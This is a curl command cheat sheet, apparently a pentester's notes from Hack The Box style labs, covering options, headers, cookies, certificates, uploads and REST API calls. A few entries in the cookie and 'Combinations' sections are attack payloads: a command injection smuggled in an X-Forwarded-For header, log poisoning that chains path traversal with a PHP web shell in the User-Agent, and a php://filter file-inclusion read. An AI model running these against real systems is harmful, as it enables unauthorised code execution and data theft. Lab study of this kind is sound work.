---
icon: curling-stone
description: Client URL
---

# curl

{% hint style="info" %}
## <mark style="color:purple;">Basic Options</mark>

{% code title="Verbose" %}
```bash
curl -v <IP>
```
{% endcode %}

{% code title="More Verbose" %}
```bash
curl -vvv <IP>
```
{% endcode %}

{% code title="Show Errors" %}
```bash
curl -S https://example.com
```
{% endcode %}

{% code title="Load options from a local file" %}
```bash
curl -K config.txt
```
{% endcode %}

{% code title="Download a page/file" %}
```bash
curl -O https://example.com
```
{% endcode %}

{% code title="Save file with a custom name" %}
```bash
curl https://example.com -o file.txt
```
{% endcode %}

{% code title="Silent Status" %}
```bash
curl -s inlanefreight.com/index.html
```
{% endcode %}

{% code title="Follow Redirection" %}
```bash
curl -L
```
{% endcode %}
{% endhint %}

***

{% hint style="warning" %}
## <mark style="color:purple;">Requests</mark>

{% code title="Send POST request" %}
```bash
curl -d "enter data here" http://IP:PORT
```
{% endcode %}

{% code title="Retrieve Headers + body" %}
```bash
curl -i https://example.com
```
{% endcode %}

{% code title="Retrieve Only Headers" %}
```bash
curl -I https://example.com
```
{% endcode %}

{% code title="Manipulate Headers" %}
```bash
curl -H 'HEADER:VALUE' https://example.com
```
{% endcode %}

{% code title="Set User-Agent header" %}
```bash
curl https://example.com -A 'Mozilla/5.0'
```
{% endcode %}

{% code title="Credentials" %}
```bash
curl -u user:pass https://example.com
```
{% endcode %}

{% code title="Credentials Within URL" %}
```bash
curl http://username:password@example.com:PORT
```
{% endcode %}

***

### <mark style="color:purple;">Cookies</mark>

{% code title="Set Specific Cookie" %}
```bash
curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://www.example.net:PORT
```
{% endcode %}

{% code title="Save Cookie in to a file" %}
```bash
curl -X POST -d "flag=UHC{F1rst_5tep_2_Qualify}" -c cookies.txt -v http://10.10.11.128/challenge.php
```
{% endcode %}

{% code title="Use cookie from the file" %}
```bash
curl -H "X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.16.7;" -b cookies.txt -v http://10.10.11.128/firewall.php
```
{% endcode %}

***

### <mark style="color:purple;">Certificates</mark>

{% code title="Skip SSL Certificate validation" %}
```bash
curl -k -v https://example.com
```
{% endcode %}

{% code title="Specify a CA file" %}
```bash
curl --cacert /path/to/ca-cert.pem https://secure.example.com
```
{% endcode %}

{% code title="Specify a CA directory" %}
```bash
curl --capath /path/to/cacerts https://secure.example.com
```
{% endcode %}

{% code title="Specify a Client Certificate" %}
```bash
curl -E /path/to/client-cert.pem https://secure.example.com
```
{% endcode %}

{% code title="Specify the Certificate format" %}
```bash
curl -E /path/to/client-cert.pem --cert-type PEM|DER|ENG https://secure.example.com
```
{% endcode %}

{% code title="Skip SSL + verbose + Client Certificate" %}
```bash
curl -k -v -E /path/to/client_certificate.pem https://example.com
```
{% endcode %}

{% code title="Skip SSL + Verbose + Specific Certificate" %}
```bash
curl -k -v --cacert /path/to/ca_certificate.crt https://example.com
```
{% endcode %}

{% code title="Skip SSL + verbose + Client Certificate & Key" %}
```bash
curl -k -v --cert client_cert_and_key.pem --cert-type PEM https://test.me
```
{% endcode %}
{% endhint %}

***

{% hint style="success" %}
## <mark style="color:purple;">File Uploads</mark>

{% code title="File Upload" %}
```bash
curl -T example.txt https://example.com/upload
```
{% endcode %}

{% code title="File Upload + POST" %}
```bash
curl -T example.txt -X POST https://example.com/upload
```
{% endcode %}

{% code title="File upload + Authentication" %}
```bash
curl -u user:pass -T example.txt https://example.com/upload
```
{% endcode %}

{% code title="File Upload + Token Authentication" %}
```bash
curl -u :YOUR_TOKEN -T example.txt https://example.com/upload
```
{% endcode %}

{% code title="File Upload + Custom Header" %}
```bash
curl -H "Authorization: Bearer YOUR_TOKEN" -T example.txt https://example.com/upload
```
{% endcode %}

{% code title="File Upload + Multiple Custom Headers" %}
```bash
curl -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -T example.txt https://example.com/upload
```
{% endcode %}

{% code title="Multiple File Uploads" %}
```bash
curl -T file1.txt -T file2.txt https://example.com/upload
```
{% endcode %}

{% code title="File Upload as Form submission" %}
```bash
curl -F "file=@example.txt" https://example.com/upload
```
{% endcode %}

{% code title="File Upload + Additional Query Parameters" %}
```bash
curl -T example.txt "https://example.com/upload?user=alice&timestamp=2024"
```
{% endcode %}

{% code title="File Upload + Redirect" %}
```bash
curl -L -T example.txt https://example.com/upload
```
{% endcode %}

{% code title="File Upload + Retry" %}
```bash
curl --retry 5 -T example.txt https://example.com/upload
```
{% endcode %}

{% code title="File Upload to FTP server" %}
```bash
curl -T example.txt ftp://ftp.example.com/upload/
```
{% endcode %}

{% code title="File Upload + Custom HTTP Method" %}
```bash
curl -X PATCH -T example.txt https://example.com/upload
```
{% endcode %}
{% endhint %}

***

{% hint style="warning" %}
## <mark style="color:purple;">APIs</mark>

{% code title="Read all entries" %}
```bash
curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq
```
{% endcode %}

{% code title="POST + Cookie" %}
```bash
curl -X POST -d '{"search":"london"}' -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' -H 'Content-Type: application/json' http://www.example.net:PORT/search.php
```
{% endcode %}

{% code title="Create Entry" %}
```bash
curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
```
{% endcode %}

{% code title="Update Entry" %}
```bash
curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
```
{% endcode %}

{% code title="Delete Entry" %}
```bash
curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City
```
{% endcode %}
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Combinations</mark>

{% code title="Stealth + SSL Skip + Full details" %}
```bash
curl -s -k -v -i IP
```
{% endcode %}

{% code title="Skip SSL + Verbose + http2" %}
```bash
curl -k -v --http2 <URL>
```
{% endcode %}

{% code title="Stealth + Path Traversal + PHP Revshell Header" %}
```bash
curl -s "http://83.136.249.227:31647/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log" -A "<?php system($_GET['cmd']); ?>"
```
{% endcode %}

{% code title="POST + Key-Value pairs Content Header" %}
```bash
curl http://example.net:44626/example.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'
```
{% endcode %}

{% code title="Loop Multiple Queries" %}
```bash
for i in {1..100}; do echo -n "Post $i: "; curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=$i | tr -s '\n'; done  | tee post-name-list
```
{% endcode %}

{% code title="Wrapper + base64 Encode + Regex" %}
```bash
curl http://94.237.55.12:38697/index.php\?language\=php://filter/read\=convert.base64-encode/resource\=configure |  awk 'BEGIN { body=0 } /^$/ { body=1 } body { print }' | grep -o '[A-Za-z0-9+/=]\{20,\}'
```
{% endcode %}
{% endhint %}
